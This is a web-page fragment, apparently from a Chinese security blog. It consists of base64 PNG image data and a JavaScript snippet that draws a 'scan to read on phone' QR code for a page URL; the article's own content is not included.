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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-Service-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 